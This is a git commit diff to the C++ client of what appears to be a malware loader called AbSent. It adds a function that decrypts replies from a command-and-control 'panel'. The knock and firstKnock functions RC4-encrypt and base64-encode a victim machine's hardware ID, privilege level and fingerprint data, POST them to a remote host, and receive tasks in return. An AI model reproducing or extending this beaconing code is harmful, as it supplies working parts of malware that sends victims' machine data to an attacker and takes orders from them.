bcbcde50be1af51cb407d31b7956ca459886cb72
yattaze <arthurhuia@gmail.com>
2019-04-25 18:54:45 +1200

    decryptResponce()

--- Client/Full/AbSentClientFull/AbSentClientFull/AbSent/comm/panel.h
+++ Client/Full/AbSentClientFull/AbSentClientFull/AbSent/comm/panel.h
@@ -1,11 +1,5 @@
 #pragma once
 /*
-	Request - Knock (Encrypted + Base64)
-	{
-		"hardwareID": "",
-		"privilege: ""
-	}
-
 	Responce
 	{
 		"task": (Internal Task ID, 0 for notask),
@@ -19,6 +13,15 @@ namespace absent
 {
 	namespace panel
 	{
+		nlohmann::json decryptResponce(std::string res, std::string key)
+		{
+			absent::crypto::RC4 rc4;
+			nlohmann::json responce = nlohmann::json::parse(absent::crypto::b64::decode(res.c_str()));
+			for (auto& el : responce.items()) { std::string val = el.value(); el.value() = rc4.crypt(absent::crypto::b64::decode(val.c_str()), key); }
+			return responce;
+
+		}
+
 		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
 		{
 			absent::crypto::RC4 rc4;
@@ -27,7 +30,7 @@ namespace absent
 			for (int ip = 0; ip < info["fp"].size(); ip++) { info["fp"][ip] = absent::crypto::b64::encode(rc4.crypt(info["fp"][ip], key).c_str()); }
 			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());
 
-			return absent::http::post(host, path, toSend);
+			return decryptResponce(absent::http::post(host, path, toSend), key);
 		}
 
 		std::string knock(std::string host, std::string path, nlohmann::json info, std::string key)
@@ -40,7 +43,7 @@ namespace absent
 			};
 			std::string toSend = absent::crypto::b64::encode(smallInfo.dump().c_str());
 			
-			return absent::http::post(host, path, toSend);
+			return decryptResponce(absent::http::post(host, path, toSend), key);
 		}
 	}
 }
